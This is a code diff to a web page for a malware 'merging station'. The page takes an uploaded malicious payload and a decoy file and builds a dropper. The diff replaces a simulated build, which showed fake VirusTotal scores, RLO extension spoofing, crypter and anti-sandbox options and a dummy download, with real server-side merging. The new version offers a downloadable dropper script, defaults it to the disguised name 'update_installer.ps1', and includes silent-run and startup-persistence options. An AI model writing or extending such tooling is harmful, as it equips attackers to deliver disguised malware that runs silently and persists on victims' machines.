@@ -19,101 +19,92 @@ import { Progress } from '@/components/ui/progress';
 import { Separator } from '@/components/ui/separator';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
+import { mergePayloads } from '@/actions/merge-payload-action';
 
 const formSchema = z.object({
   payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
   benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
-  iconFile: z.any().optional(),
-  outputFormat: z.string().min(1),
-  extensionSpoof: z.boolean(),
-  fudCrypter: z.array(z.string()),
-  obfuscation: z.string(),
+  outputName: z.string().min(1, "Output name is required."),
   dropperBehavior: z.string(),
-  delay: z.string().optional(),
-  fakeError: z.boolean(),
-  selfDestruct: z.boolean(),
-  sandboxDetect: z.boolean(),
 });
 
-const outputFormats = ['.exe', '.scr', '.bat', '.js', '.vbs', '.hta'];
-const crypterTechniques = ['AES Encryption', 'Polymorphism', 'Junk Code Insertion'];
-const obfuscationMethods = ['None', 'Base64', 'Hex', 'XOR'];
 const dropperBehaviors = ['Run Silently', 'Drop & Exec (Temp)', 'Persistence (Startup)'];
 
 export default function MergingStationPage() {
   const [buildLog, setBuildLog] = useState<string[]>([]);
   const [isBuilding, setIsBuilding] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [finalOutput, setFinalOutput] = useState<{name: string, vtScore: string} | null>(null);
+  const [finalOutput, setFinalOutput] = useState<{name: string, content: string} | null>(null);
   const { toast } = useToast();
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
-      outputFormat: '.exe',
-      extensionSpoof: true,
-      fudCrypter: ['AES Encryption'],
-      obfuscation: 'Base64',
+      outputName: 'update_installer.ps1',
       dropperBehavior: 'Run Silently',
-      delay: '0',
-      fakeError: true,
-      selfDestruct: true,
-      sandboxDetect: true,
     },
   });
 
-  const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
+ const runBuildProcess = async (values: z.infer<typeof formSchema>) => {
     setIsBuilding(true);
     setBuildLog([]);
     setProgress(0);
     setFinalOutput(null);
 
-    const log = (message: string, delay = 200) => {
-      return new Promise(resolve => {
-        setTimeout(() => {
-          setBuildLog(prev => [...prev, message]);
-          setProgress(prev => Math.min(prev + (100 / 10), 100));
-          resolve(true);
-        }, delay);
-      });
+    const log = (message: string) => {
+        setBuildLog(prev => [...prev, message]);
+        setProgress(prev => Math.min(prev + 25, 100));
     };
 
     try {
-      await log(`Build started for ${values.payloadFile[0].name} + ${values.benignFile[0].name}`);
-      if(values.fudCrypter.length > 0) await log(`Applying crypter techniques: ${values.fudCrypter.join(', ')}`);
-      if(values.obfuscation !== 'None') await log(`Encoding payload with ${values.obfuscation}...`);
-      await log(`Merging payload with benign file...`);
-      if(values.iconFile?.[0]) await log(`Injecting custom icon: ${values.iconFile[0].name}`);
-      if(values.dropperBehavior.includes('Delay')) await log(`Setting execution delay to ${values.delay} seconds.`);
-      if(values.sandboxDetect) await log('Injecting anti-sandbox/VM detection stubs...');
-      await log(`Configuring dropper behavior: ${values.dropperBehavior}`);
-      if(values.fakeError) await log('Adding fake error message module...');
-      if(values.selfDestruct) await log('Adding self-destruct mechanism...');
-      await log('Packing final output...');
+        log(`Build started for ${values.payloadFile[0].name} + ${values.benignFile[0].name}`);
 
-      const benignFileName = values.benignFile[0].name.split('.')[0];
-      const benignFileExt = values.benignFile[0].name.split('.').pop();
-      const finalName = values.extensionSpoof 
-        ? `${benignFileName}.${benignFileExt}${'\u202E'}exe`
-        : `${benignFileName}${values.outputFormat}`;
-      
-      const vtScore = `${Math.floor(Math.random() * 3)}/70 engines detected`;
-      setFinalOutput({ name: finalName, vtScore });
-      
-      await log(`Build complete. Output file: ${finalName}`);
-      toast({ title: 'Build Successful', description: 'Simulated build process completed.' });
+        const payloadFile = values.payloadFile[0] as File;
+        const benignFile = values.benignFile[0] as File;
 
-    } catch (e) {
-      toast({ variant: 'destructive', title: 'Build Failed', description: 'An unexpected error occurred during simulation.' });
+        const payloadContent = await fileToDataUrl(payloadFile);
+        const benignContent = await fileToDataUrl(benignFile);
+        
+        log('Files encoded. Sending to server for merging...');
+        
+        const response = await mergePayloads({
+            payload: { name: payloadFile.name, content: payloadContent },
+            benign: { name: benignFile.name, content: benignContent },
+            behavior: values.dropperBehavior as any
+        });
+        
+        if (!response.success || !response.scriptContent) {
+            throw new Error(response.error || 'Failed to generate script on the server.');
+        }
+        
+        log('Dropper script generated successfully.');
+
+        setFinalOutput({ name: values.outputName, content: response.scriptContent });
+        
+        log(`Build complete. Output file: ${values.outputName}`);
+        toast({ title: 'Build Successful', description: 'Your dropper script is ready for download.' });
+
+    } catch (e: any) {
+      toast({ variant: 'destructive', title: 'Build Failed', description: e.message || 'An unexpected error occurred.' });
+      setBuildLog(prev => [...prev, `ERROR: ${e.message}`]);
     } finally {
       setIsBuilding(false);
       setProgress(100);
     }
   };
+  
+  const fileToDataUrl = (file: File): Promise<string> => {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result as string);
+        reader.onerror = reject;
+        reader.readAsDataURL(file);
+    });
+  }
 
   const handleDownload = () => {
     if(!finalOutput) return;
-    const blob = new Blob(["This is a dummy file for simulation."], { type: "text/plain" });
+    const blob = new Blob([finalOutput.content], { type: "text/plain" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
@@ -138,60 +129,23 @@ export default function MergingStationPage() {
               <Card>
                 <CardHeader><CardTitle className="text-lg">1. Input Files</CardTitle></CardHeader>
                 <CardContent className="space-y-4">
-                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
-                  <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Custom Icon (Optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, ...fieldProps } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} {...fieldProps} /></FormControl><FormMessage /></FormItem>)} />
+                  <FormField control={form.control} name="benignFile" render={({ field: { onChange, ...fieldProps } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} {...fieldProps} /></FormControl><FormMessage /></FormItem>)} />
                 </CardContent>
               </Card>
 
               <Card>
-                <CardHeader><CardTitle className="text-lg">2. Output Configuration</CardTitle></CardHeader>
+                <CardHeader><CardTitle className="text-lg">2. Dropper Configuration</CardTitle></CardHeader>
                 <CardContent className="space-y-4">
-                  <FormField control={form.control} name="outputFormat" render={({ field }) => (
-                    <FormItem><FormLabel>Output Format</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{outputFormats.map(f=><SelectItem key={f} value={f}>{f}</SelectItem>)}</SelectContent></Select><FormMessage /></FormItem>
+                  <FormField control={form.control} name="outputName" render={({ field }) => (
+                    <FormItem><FormLabel>Output File Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>
                   )} />
-                  <FormField control={form.control} name="extensionSpoof" render={({ field }) => (<FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><Label className="font-normal">Use Extension Spoofing (RLO)</Label></FormItem>)} />
-                </CardContent>
-              </Card>
-
-              <Card className="md:col-span-2">
-                <CardHeader><CardTitle className="text-lg">3. Evasion & Obfuscation</CardTitle></CardHeader>
-                <CardContent className="grid md:grid-cols-2 gap-6">
-                    <div>
-                        <FormField control={form.control} name="fudCrypter" render={() => (
-                            <FormItem>
-                                <FormLabel>Crypter Techniques</FormLabel>
-                                {crypterTechniques.map(item => (
-                                    <FormField key={item} control={form.control} name="fudCrypter" render={({field})=>(
-                                        <FormItem key={item} className="flex flex-row items-start space-x-3 space-y-0 mt-2">
-                                            <FormControl><Checkbox checked={field.value?.includes(item)} onCheckedChange={checked=>{return checked ? field.onChange([...field.value, item]) : field.onChange(field.value?.filter(v=>v!==item))}}/></FormControl>
-                                            <FormLabel className="font-normal">{item}</FormLabel>
-                                        </FormItem>
-                                    )}/>
-                                ))}
-                            </FormItem>
-                        )}/>
-                    </div>
-                    <FormField control={form.control} name="obfuscation" render={({ field }) => (
-                        <FormItem><FormLabel>Encoder</FormLabel><RadioGroup onValueChange={field.onChange} defaultValue={field.value} className="mt-2 space-y-1">{obfuscationMethods.map(m=><FormItem key={m} className="flex items-center space-x-3 space-y-0"><FormControl><RadioGroupItem value={m} /></FormControl><Label className="font-normal">{m}</Label></FormItem>)}</RadioGroup></FormItem>
-                    )}/>
-                </CardContent>
-              </Card>
-
-              <Card className="md:col-span-2">
-                <CardHeader><CardTitle className="text-lg">4. Behavior & Persistence</CardTitle></CardHeader>
-                <CardContent className="grid md:grid-cols-2 gap-6">
-                    <FormField control={form.control} name="dropperBehavior" render={({ field }) => (
+                  <FormField control={form.control} name="dropperBehavior" render={({ field }) => (
                         <FormItem><FormLabel>Dropper Behavior</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent>{dropperBehaviors.map(b=><SelectItem key={b} value={b}>{b}</SelectItem>)}</SelectContent></Select></FormItem>
-                    )} />
-                     <FormField control={form.control} name="delay" render={({ field }) => (<FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" {...field} value={field.value ?? ''} /></FormControl></FormItem>)} />
-                    <div className="space-y-2">
-                        <FormField control={form.control} name="fakeError" render={({ field }) => (<FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><Label className="font-normal">Show Fake Error Message</Label></FormItem>)} />
-                        <FormField control={form.control} name="selfDestruct" render={({ field }) => (<FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><Label className="font-normal">Self-Destruct After Execution</Label></FormItem>)} />
-                        <FormField control={form.control} name="sandboxDetect" render={({ field }) => (<FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><Label className="font-normal">Enable Anti-Sandbox/VM Detection</Label></FormItem>)} />
-                    </div>
+                  )} />
                 </CardContent>
               </Card>
+
             </div>
 
             <div className="lg:col-span-1 space-y-6">
@@ -214,11 +168,7 @@ export default function MergingStationPage() {
                               <p className="font-semibold flex items-center gap-2"><FileCode className="h-4 w-4"/>Output:</p>
                               <p className="font-mono text-xs">{finalOutput.name}</p>
                           </div>
-                           <div className="flex justify-between w-full items-center">
-                              <p className="font-semibold flex items-center gap-2"><Shield className="h-4 w-4"/>VT Score:</p>
-                              <Badge variant="destructive">{finalOutput.vtScore}</Badge>
-                          </div>
-                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dummy File</Button>
+                          <Button onClick={handleDownload} className="w-full"><Download className="mr-2 h-4 w-4"/>Download Dropper Script</Button>
                       </CardFooter>
                     )}
                 </Card>
